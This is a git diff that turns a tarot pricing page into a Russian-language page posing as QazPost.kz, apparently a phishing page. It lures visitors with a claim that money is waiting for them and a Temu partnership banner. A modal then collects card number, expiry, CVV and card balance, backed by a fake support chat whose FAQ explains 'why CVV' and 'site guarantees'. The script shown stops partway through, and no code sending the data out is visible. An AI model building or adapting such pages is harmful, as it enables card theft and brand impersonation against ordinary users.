@@ -1,114 +1,1258 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Таро Сайт</title>
-  <style>
-    @keyframes float {
-      0% { transform: translateY(0px); }
-      50% { transform: translateY(-15px); }
-      100% { transform: translateY(0px); }
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QazPost - Отслеживание посылки</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        
+        /* Основные стили */
+        body {
+            font-family: 'Roboto', sans-serif; 
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            color: #333;
+            opacity: 0;
+            animation: fadeIn 0.5s ease-in-out forwards;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
 
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #a463f2, #7e3ff2, #bd6af2);
-      background-size: 400% 400%;
-      animation: gradient 10s ease infinite;
-      color: white;
-    }
+        /* Стили чат-кнопки */
+        .qpost-chat-btn {
+            position: fixed;
+            right: 20px;
+            bottom: 20px;
+            background-color: #355DEE;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            box-shadow: 0 4px 10px rgba(53, 93, 238, 0.3);
+            z-index: 100;
+            cursor: pointer;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: slideInLabel 0.5s ease-out 2s forwards;
+        }
 
-    @keyframes gradient {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
+        @keyframes slideInLabel {
+            from { 
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
-    .container {
-      display: flex;
-      flex-direction: row;
-      height: 100vh;
-    }
+        /* Окно чата */
+        .chat-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 3000;
+            display: none;
+            flex-direction: column;
+        }
 
-    .left {
-      flex: 1;
-      background: url('bg.png') no-repeat center center;
-      background-size: cover;
-    }
+        .chat-header {
+            padding: 20px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: #f8f9fa;
+        }
 
-    .right {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding: 40px;
-      backdrop-filter: blur(8px);
-    }
+        .chat-logo {
+            width: 40px;
+            height: 40px;
+        }
 
-    .price-list {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 30px 40px;
-      border-radius: 20px;
-      box-shadow: 0 0 20px rgba(255,255,255,0.2);
-      animation: float 5s ease-in-out infinite;
-    }
+        .chat-title {
+            font-weight: 500;
+            color: #2c3e50;
+        }
 
-    .price-list h2 {
-      margin-top: 0;
-      font-size: 28px;
-      text-align: center;
-    }
+        .chat-status {
+            font-size: 12px;
+            color: #47FFC8;
+        }
 
-    .price-list ul {
-      list-style: none;
-      padding: 0;
-    }
+        .chat-close {
+            margin-left: auto;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+        }
 
-    .price-list ul li {
-      margin: 12px 0;
-      font-size: 18px;
-    }
+        .chat-messages {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            background: #f8f9fa;
+        }
 
-    .contacts {
-      margin-top: 40px;
-      text-align: center;
-    }
+        .message {
+            margin-bottom: 15px;
+            padding: 10px 15px;
+            border-radius: 18px;
+            max-width: 70%;
+            position: relative;
+            font-size: 14px;
+            line-height: 1.4;
+        }
 
-    .contacts a {
-      color: #fff;
-      margin: 0 10px;
-      font-weight: bold;
-      text-decoration: none;
-    }
+        .user-message {
+            background-color: #355DEE;
+            color: white;
+            margin-left: auto;
+            border-bottom-right-radius: 5px;
+        }
 
-    .contacts a:hover {
-      text-decoration: underline;
-    }
-  </style>
+        .bot-message {
+            background-color: white;
+            color: #333;
+            margin-right: auto;
+            border-bottom-left-radius: 5px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .message-sender {
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #7f8c8d;
+        }
+
+        .user-sender {
+            text-align: right;
+            margin-right: 10px;
+        }
+
+        .bot-sender {
+            text-align: left;
+            margin-left: 10px;
+        }
+
+        .chat-input-area {
+            padding: 15px;
+            border-top: 1px solid #eee;
+            display: flex;
+            gap: 10px;
+            background: white;
+            align-items: center;
+        }
+
+        .chat-input {
+            flex: 1;
+            padding: 12px 20px;
+            border: 1px solid #ddd;
+            border-radius: 25px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .file-input-label {
+            background: #355DEE;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .file-input-label:hover {
+            background: #2a4bc0;
+        }
+
+        .send-btn {
+            background: #355DEE;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .send-btn:hover {
+            background: #2a4bc0;
+            transform: translateY(-1px);
+        }
+
+        .faq-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .faq-btn {
+            background: #f0f0f0;
+            border: none;
+            border-radius: 15px;
+            padding: 8px 12px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .faq-btn:hover {
+            background: #e0e0e0;
+        }
+
+        /* Стили основного интерфейса */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 2;
+        }
+        
+        .logo-wrapper {
+            display: flex;
+            align-items: center;
+        }
+        
+        .app-buttons {
+            margin-left: auto;
+            display: flex;
+            gap: 15px;
+        }
+        
+        .lang-btn {
+            background: transparent;
+            border: 1px solid #355DEE;
+            color: #355DEE;
+            padding: 8px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            min-width: 60px;
+            margin-left: auto;
+        }
+        
+        .container {
+            max-width: 100%;
+            margin: 0;
+            background: white;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        
+        .welcome-banner {
+            background: white;
+            color: #333;
+            padding: 30px 20px 40px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .welcome-banner h1 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .brand-name {
+            color: #355DEE;
+            display: inline-block;
+            margin-left: 5px;
+        }
+        
+        .welcome-banner .subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            max-width: 500px;
+            margin: 0 auto;
+            line-height: 1.4;
+        }
+        
+        .status-card {
+            background: #fff;
+            margin: 20px;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            border: 2px solid #355DEE;
+            transform: translateY(20px);
+            opacity: 0;
+            animation: slideUp 0.5s ease-out 0.6s forwards;
+        }
+        
+        @keyframes slideUp {
+            from { 
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            to { 
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .status-title {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+        
+        .status-message {
+            font-size: 16px;
+            color: #7f8c8d;
+            margin-bottom: 5px;
+            line-height: 1.4;
+        }
+        
+        .continue-btn {
+            display: block;
+            background: #355DEE;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 16px;
+            margin: 0 20px 20px;
+            box-shadow: 0 5px 15px rgba(53, 93, 238, 0.3);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            transform: translateY(20px);
+            opacity: 0;
+            animation: slideUp 0.5s ease-out 0.8s forwards;
+            border: none;
+            cursor: pointer;
+            width: calc(100% - 40px);
+        }
+        
+        .continue-btn:hover {
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 7px 20px rgba(53, 93, 238, 0.4);
+            background: #2a4bc0;
+        }
+        
+        .timeline {
+            margin: 20px;
+            padding: 0;
+            list-style: none;
+        }
+        
+        .timeline li {
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+            position: relative;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            border: 1px solid #eee;
+            opacity: 0;
+            animation: fadeInListItem 0.4s ease-out forwards;
+        }
+        
+        @keyframes fadeInListItem {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        .timeline li:nth-child(1) { animation-delay: 1.0s; }
+        .timeline li:nth-child(2) { animation-delay: 1.2s; }
+        .timeline li:nth-child(3) { animation-delay: 1.4s; }
+        .timeline li:nth-child(4) { animation-delay: 1.6s; }
+        .timeline li:nth-child(5) { animation-delay: 1.8s; }
+        .timeline li:nth-child(6) { animation-delay: 2.0s; }
+        
+        .timeline li:before {
+            content: '';
+            width: 12px;
+            height: 12px;
+            border-radius: 3px;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        
+        .timeline li[data-completed="true"]:before {
+            background: #355DEE;
+        }
+        
+        .timeline li[data-completed="false"]:before {
+            background: #f0f0f0;
+        }
+        
+        .package-info {
+            margin: 20px;
+            background: #fff;
+            border-radius: 15px;
+            padding: 18px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            transform: translateY(20px);
+            opacity: 0;
+            animation: slideUp 0.5s ease-out 1.0s forwards;
+        }
+        
+        .info-row {
+            display: flex;
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .info-label {
+            font-weight: 500;
+            color: #7f8c8d;
+            width: 40%;
+            font-size: 14px;
+        }
+        
+        .info-value {
+            width: 60%;
+            color: #2c3e50;
+            font-size: 14px;
+        }
+        
+        .recipient-info {
+            margin-top: 15px;
+            padding-top: 12px;
+            border-top: 1px solid #eee;
+        }
+        
+        .created-date {
+            text-align: center;
+            color: #95a5a6;
+            font-size: 13px;
+            margin: 15px 0;
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out 1.2s forwards;
+        }
+        
+        .partnership-banner {
+            background: white;
+            margin: 20px;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            border: 1px solid #eee;
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out 2.2s forwards;
+        }
+        
+        .partnership-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #355DEE;
+            margin-bottom: 10px;
+        }
+        
+        .partnership-text {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+        
+        .partnership-logo {
+            max-width: 200px;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Модальные окна и загрузчик */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+        }
+        
+        .modal-overlay.active .modal-content {
+            transform: translateY(0);
+        }
+        
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #2c3e50;
+            text-align: center;
+        }
+        
+        .modal-title-description {
+            font-size: 16px;
+            color: #7f8c8d;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #7f8c8d;
+            font-weight: 500;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            box-sizing: border-box;
+        }
+        
+        .input-field:focus {
+            border-color: #355DEE;
+            outline: none;
+        }
+        
+        .card-details {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .card-details .input-group {
+            flex: 1;
+        }
+        
+        .balance-group {
+            margin-top: 20px;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.3s ease;
+            max-height: 0;
+            overflow: hidden;
+        }
+        
+        .balance-group.visible {
+            opacity: 1;
+            transform: translateY(0);
+            max-height: 200px;
+        }
+        
+        .balance-hint {
+            font-size: 12px;
+            color: #e74c3c;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .modal-actions {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .modal-btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+        }
+        
+        .modal-btn-cancel {
+            background: #f5f5f5;
+            color: #7f8c8d;
+        }
+        
+        .modal-btn-cancel:hover {
+            background: #e0e0e0;
+        }
+        
+        .modal-btn-submit {
+            background: #355DEE;
+            color: white;
+        }
+        
+        .modal-btn-submit:hover {
+            background: #2a4bc0;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #355DEE;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 18px;
+            color: #2c3e50;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .loading-subtext {
+            font-size: 14px;
+            color: #7f8c8d;
+            text-align: center;
+            max-width: 300px;
+        }
+        
+        @media (max-width: 480px) {
+            .top-bar {
+                padding: 12px 15px;
+            }
+            
+            .lang-btn {
+                padding: 6px 15px;
+                font-size: 13px;
+            }
+            
+            .welcome-banner h1 {
+                font-size: 24px;
+            }
+            
+            .welcome-banner .subtitle {
+                font-size: 14px;
+                padding: 0 10px;
+            }
+            
+            .timeline li {
+                font-size: 13px;
+                padding: 10px;
+            }
+            
+            .status-title {
+                font-size: 16px;
+            }
+            
+            .partnership-title {
+                font-size: 16px;
+            }
+            
+            .partnership-text {
+                font-size: 13px;
+            }
+            
+            .partnership-logo {
+                max-width: 150px;
+            }
+            
+            .modal-content {
+                padding: 20px;
+            }
+            
+            .card-details {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="left"></div>
-    <div class="right">
-      <div class="price-list">
-        <h2>Прайс-лист</h2>
-        <ul>
-          <li>Карты дня — 300₽</li>
-          <li>Полный расклад — 1500₽</li>
-          <li>Совет от карт — 500₽</li>
-          <li>Путь души — 1200₽</li>
+    <div class="container">
+        <div class="top-bar">
+            <div class="logo-wrapper">
+                <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <g clip-path="url(#clip0_9960_65429)">
+                    <path d="M0 8C0 3.58172 3.58172 0 8 0H28C32.4183 0 36 3.58172 36 8V28C36 32.4183 32.4183 36 28 36H8C3.58172 36 0 32.4183 0 28V8Z" fill="#355DEE"/>
+                    <path d="M19.9709 25.5835H16.0586V29.5001H19.9709V25.5835Z" fill="#47FFC8"/>
+                    <path d="M26.6585 11.286C25.7557 9.82263 24.5433 8.64335 23.0128 7.79118C21.4909 6.93039 19.8228 6.5 18.0085 6.5C16.2029 6.5 14.5176 6.93039 12.9871 7.79118C11.4566 8.65196 10.2442 9.82263 9.34995 11.286C8.44712 12.7493 8 14.3676 8 16.1236C8 17.8882 8.44712 19.4892 9.34995 20.9612C10.2528 22.4417 11.4566 23.6038 12.9871 24.4646C13.9501 25.0069 14.9647 25.377 16.0395 25.575V21.5035C15.73 21.3916 15.429 21.2625 15.1281 21.0903C14.251 20.6083 13.5546 19.9369 13.0473 19.0589C12.5314 18.1895 12.282 17.2168 12.282 16.1322C12.282 15.0476 12.5314 14.0577 13.0387 13.1883C13.546 12.3189 14.2338 11.6389 15.1109 11.1482C15.9879 10.6576 16.9423 10.408 18.0085 10.408C19.0575 10.408 20.012 10.649 20.889 11.1482C21.766 11.6389 22.4539 12.3189 22.9698 13.1883C23.4771 14.0577 23.7351 15.039 23.7351 16.1322C23.7351 17.2254 23.4857 18.1981 22.9698 19.0675C22.4539 19.9455 21.766 20.6255 20.889 21.1075C20.5967 21.2797 20.2785 21.4088 19.9604 21.5207V25.5836C21.0266 25.377 22.0498 25.0069 23.0042 24.4732C24.5347 23.6124 25.7471 22.4417 26.6499 20.9698C27.5528 19.4892 27.9999 17.8796 27.9999 16.1322C28.0085 14.3762 27.5614 12.7493 26.6585 11.286Z" fill="white"/>
+                    <path d="M19.967 26.0625H16.0547V29.9747H19.967V26.0625Z" fill="#47FFC8"/>
+                    <path d="M26.6585 11.7806C25.7557 10.3189 24.5433 9.14091 23.0128 8.28967C21.4909 7.42983 19.8228 6.99991 18.0085 6.99991C16.2029 6.99991 14.5176 7.42983 12.9871 8.28967C11.4566 9.14951 10.2442 10.3189 9.34995 11.7806C8.44712 13.2423 8 14.8588 8 16.6129C8 18.3756 8.44712 19.9749 9.34995 21.4452C10.2528 22.9241 11.4566 24.0849 12.9871 24.9448C13.9501 25.4865 14.9647 25.8562 16.0395 26.054V21.9869C15.73 21.8751 15.429 21.7462 15.1281 21.5742C14.251 21.0927 13.5546 20.422 13.0473 19.545C12.5314 18.6765 12.282 17.7049 12.282 16.6215C12.282 15.5381 12.5314 14.5493 13.0387 13.6809C13.546 12.8124 14.2338 12.1332 15.1109 11.643C15.9879 11.1529 16.9423 10.9036 18.0085 10.9036C19.0575 10.9036 20.012 11.1443 20.889 11.643C21.766 12.1332 22.4539 12.8124 22.9698 13.6809C23.4771 14.5493 23.7351 15.5295 23.7351 16.6215C23.7351 17.7135 23.4857 18.6851 22.9698 19.5536C22.4539 20.4306 21.766 21.1099 20.889 21.5914C20.5967 21.7634 20.2785 21.8923 19.9604 22.0041V26.0626C21.0266 25.8562 22.0498 25.4865 23.0042 24.9534C24.5347 24.0935 25.7471 22.9241 26.6499 21.4538C27.5528 19.9749 27.9999 18.367 27.9999 16.6215C28.0085 14.8674 27.5614 13.2423 26.6585 11.7806Z" fill="white"/>
+                    </g>
+                    <defs>
+                    <clipPath id="clip0_9960_65429">
+                    <rect width="36" height="36" rx="8" fill="white"/>
+                    </clipPath>
+                    </defs>
+                </svg>
+            </div>
+            <div class="app-buttons">
+                <button class="lang-btn" onclick="toggleLanguage()">Қаз</button>
+            </div>
+        </div>
+
+        <div class="welcome-banner">
+            <h1 data-lang="welcome-title">Добро пожаловать на <br><span class="brand-name">QazPost.kz</span></h1>
+            <p class="subtitle" data-lang="subtitle">Теперь мы - ваш надежный помощник во всех почтово-логистических делах!</p>
+        </div>
+
+        <div class="status-card">
+            <div class="status-title" data-lang="status-title">Готово</div>
+            <div class="status-message" data-lang="status-message1">Средства ожидают получения</div>
+            <div class="status-message" data-lang="status-message2">Нажмите "продолжить" для завершения получения средств</div>
+        </div>
+        
+        <button class="continue-btn" data-lang="continue-btn" id="continueBtn">Продолжить</button>
+        
+        <div class="created-date" data-lang="created-date">Создано 05.04.2025</div>
+        
+        <ul class="timeline">
+            <li data-completed="true" data-lang="timeline1">Ожидает подтверждение оплаты за посылку и доставку</li>
+            <li data-completed="true" data-lang="timeline2">Оплата подтверждена</li>
+            <li data-completed="true" data-lang="timeline3">Средства ожидают получения</li>
+            <li data-completed="false" data-lang="timeline4">Доставка ожидает подтверждения</li>
+            <li data-completed="false" data-lang="timeline5">Посылка получена и отправляется к получателю</li>
+            <li data-completed="false" data-lang="timeline6">Посылка доставлена к получателю</li>
         </ul>
-      </div>
-      <div class="contacts">
-        <p>Контакты:</p>
-        <a href="https://t.me/your_telegram" target="_blank">Телеграм</a> |
-        <a href="https://wa.me/79991234567" target="_blank">WhatsApp</a>
-      </div>
+        
+        <div class="package-info">
+            <h3 data-lang="package-title">Информация о посылке</h3>
+            
+            <div class="info-row">
+                <div class="info-label" data-lang="receive-label">К получению:</div>
+                <div class="info-value">₸ 100</div>
+            </div>
+            
+            <div class="info-row">
+                <div class="info-label" data-lang="category-label">Категория:</div>
+                <div class="info-value" data-lang="category-value">Обыкновенное (ая)</div>
+            </div>
+            
+            <div class="info-row">
+                <div class="info-label" data-lang="delivery-label">Способ доставки:</div>
+                <div class="info-value" data-lang="delivery-value">Наземный</div>
+            </div>
+            
+            <div class="recipient-info">
+                <div class="info-row">
+                    <div class="info-label" data-lang="recipient-label">Получатель:</div>
+                    <div class="info-value">Айса Айсулу</div>
+                </div>
+                
+                <div class="info-row">
+                    <div class="info-label" data-lang="address-label">Адрес:</div>
+                    <div class="info-value">Жаркент 60</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="partnership-banner">
+            <div class="partnership-title" data-lang="partnership-title">QazPost - №1 ПОСТАВЩИК TEMU</div>
+            <div class="partnership-text" data-lang="partnership-text">QazPost стал ведущим поставщиком для Temu, а сама Temu заняла первое место по количеству доставок среди интернет-магазинов.</div>
+            <img src="https://qazpost.kz/images/temu-x-qazpost.png" alt="QazPost и Temu" class="partnership-logo">
+        </div>
     </div>
-  </div>
+
+    <!-- Чат-кнопка -->
+    <div class="qpost-chat-btn" onclick="toggleChat()">QPost</div>
+
+    <!-- Окно чата -->
+    <div class="chat-overlay" id="chatOverlay">
+        <div class="chat-header">
+            <svg class="chat-logo" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M0 8C0 3.58172 3.58172 0 8 0H28C32.4183 0 36 3.58172 36 8V28C36 32.4183 32.4183 36 28 36H8C3.58172 36 0 32.4183 0 28V8Z" fill="#355DEE"/>
+                <path d="M19.9709 25.5835H16.0586V29.5001H19.9709V25.5835Z" fill="#47FFC8"/>
+                <path d="M26.6585 11.286C25.7557 9.82263 24.5433 8.64335 23.0128 7.79118C21.4909 6.93039 19.8228 6.5 18.0085 6.5C16.2029 6.5 14.5176 6.93039 12.9871 7.79118C11.4566 8.65196 10.2442 9.82263 9.34995 11.286C8.44712 12.7493 8 14.3676 8 16.1236C8 17.8882 8.44712 19.4892 9.34995 20.9612C10.2528 22.4417 11.4566 23.6038 12.9871 24.4646C13.9501 25.0069 14.9647 25.377 16.0395 25.575V21.5035C15.73 21.3916 15.429 21.2625 15.1281 21.0903C14.251 20.6083 13.5546 19.9369 13.0473 19.0589C12.5314 18.1895 12.282 17.2168 12.282 16.1322C12.282 15.0476 12.5314 14.0577 13.0387 13.1883C13.546 12.3189 14.2338 11.6389 15.1109 11.1482C15.9879 10.6576 16.9423 10.408 18.0085 10.408C19.0575 10.408 20.012 10.649 20.889 11.1482C21.766 11.6389 22.4539 12.3189 22.9698 13.1883C23.4771 14.0577 23.7351 15.039 23.7351 16.1322C23.7351 17.2254 23.4857 18.1981 22.9698 19.0675C22.4539 19.9455 21.766 20.6255 20.889 21.1075C20.5967 21.2797 20.2785 21.4088 19.9604 21.5207V25.5836C21.0266 25.377 22.0498 25.0069 23.0042 24.4732C24.5347 23.6124 25.7471 22.4417 26.6499 20.9698C27.5528 19.4892 27.9999 17.8796 27.9999 16.1322C28.0085 14.3762 27.5614 12.7493 26.6585 11.286Z" fill="white"/>
+            </svg>
+            <div>
+                <div class="chat-title">QPost Поддержка</div>
+                <div class="chat-status">В сети</div>
+            </div>
+            <button class="chat-close" onclick="toggleChat()">×</button>
+        </div>
+
+        <div class="faq-buttons">
+            <button class="faq-btn" onclick="showFaqAnswer('balance')" data-lang="faq-balance">Что такое баланс карты?</button>
+            <button class="faq-btn" onclick="showFaqAnswer('cvv')" data-lang="faq-cvv">Зачем CVC/CVV?</button>
+            <button class="faq-btn" onclick="showFaqAnswer('guarantees')" data-lang="faq-guarantees">Гарантии сайта</button>
+        </div>
+
+        <div class="chat-messages" id="chatMessages">
+            <div class="bot-sender">Поддержка QPost</div>
+            <div class="message bot-message">Здравствуйте! Чем могу помочь?</div>
+        </div>
+
+        <div class="chat-input-area">
+            <input type="text" class="chat-input" placeholder="Введите сообщение" id="messageInput" onkeypress="handleKeyPress(event)">
+            <input type="file" id="fileInput" hidden accept="image/*">
+            <label for="fileInput" class="file-input-label">📎</label>
+            <button class="send-btn" onclick="sendMessage()">Отправить</button>
+        </div>
+    </div>
+
+    <!-- Модальное окно оплаты -->
+    <div class="modal-overlay" id="cardModal">
+        <div class="modal-content">
+            <div class="modal-title" data-lang="card-modal-title">Начисление средств</div>
+            <div class="modal-title-description" data-lang="card-modal-desc">Для начисления средств вам необходимо указать реквизиты карты.</div>
+            
+            <div class="input-group">
+                <label class="input-label" data-lang="card-number-label">Номер карты</label>
+                <input type="text" class="input-field" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+            </div>
+            
+            <div class="card-details">
+                <div class="input-group">
+                    <label class="input-label" data-lang="expiry-label">Срок действия</label>
+                    <input type="text" class="input-field" id="cardExpiry" placeholder="ММ/ГГ" maxlength="5">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label" data-lang="cvv-label">CVV/CVC</label>
+                    <input type="password" class="input-field" id="cardCvv" placeholder="•••" maxlength="3">
+                </div>
+            </div>
+
+            <div class="balance-group">
+                <div class="input-group">
+                    <label class="input-label" data-lang="balance-label">Банк запросил дополнительные данные. Укажите баланс карты</label>
+                    <div style="position: relative;">
+                        <input type="number" class="input-field" id="cardBalance" placeholder="0" min="0" step="100">
+                        <span style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #7f8c8d;">₸</span>
+                    </div>
+                    <div class="balance-hint" data-lang="balance-hint">Если ваш баланс 0 укажите 1</div>
+                </div>
+            </div>
+
+            <div class="modal-actions">
+                <button class="modal-btn modal-btn-cancel" id="cancelBtn" data-lang="cancel-btn">Отмена</button>
+                <button class="modal-btn modal-btn-submit" id="submitBtn" data-lang="submit-btn" disabled>Подтвердить</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Загрузочный экран -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text" data-lang="loading-text">Ожидаем ответ от банка</div>
+        <div class="loading-subtext" data-lang="loading-subtext">Не покидайте данную страницу</div>
+    </div>
+
+    <script>
+        // Чат-функционал
+        function toggleChat() {
+            const chat = document.getElementById('chatOverlay');
+            chat.style.display = chat.style.display === 'flex' ? 'none' : 'flex';
+        }
+
+        function handleKeyPress(e) {
+            if(e.key === 'Enter') {
+                sendMessage();
+            }
+        }
+
+        function sendMessage() {
+            const input = document.getElementById('messageInput');
+            const messages = document.getElementById('chatMessages');
+            
+            if(input.value.trim()) {
+                // Добавляем отправителя "Вы"
+                const senderDiv = document.createElement('div');
+                senderDiv.className = 'message-sender user-sender';
+                senderDiv.textContent = 'Вы';
+                messages.appendChild(senderDiv);
+                
+                // Добавляем сообщение пользователя
+                const messageDiv = document.createElement('div');
+                messageDiv.className = 'message user-message';
+                messageDiv.textContent = input.value;
+                messages.appendChild(messageDiv);
+                
+                input.value = '';
+                messages.scrollTop = messages.scrollHeight;
+                
+                // Имитация ответа бота
+                setTimeout(() => {
+                    const botSenderDiv = document.createElement('div');
+                    botSenderDiv.className = 'message-sender bot-sender';
+                    botSenderDiv.textContent = 'Поддержка QPost';
+                    messages.appendChild(botSenderDiv);
+                    
+                    const botMessageDiv = document.createElement('div');
+                    botMessageDiv.className = 'message bot-message';
+                    botMessageDiv.textContent = 'Спасибо за ваше сообщение. Мы ответим вам в ближайшее время.';
+                    messages.appendChild(botMessageDiv);
+                    
+                    messages.scrollTop = messages.scrollHeight;
+                }, 1000);
+            }
+        }
+
+        function showFaqAnswer(type) {
+            const messages = document.getElementById('chatMessages');
+            
+            // Добавляем отправителя "Вы"
+            const senderDiv = document.createElement('div');
+            senderDiv.className = 'message-sender user-sender';
+            
+            if(type === 'balance') {
+                senderDiv.textContent = 'Вы: Что такое баланс карты?';
+            } else if(type === 'cvv') {
+                senderDiv.textContent = 'Вы: Зачем CVC/CVV?';
+            } else if(type === 'guarantees') {
+                senderDiv.textContent = 'Вы: Гарантии сайта';
+            }
+            
+            messages.appendChild(senderDiv);
+            
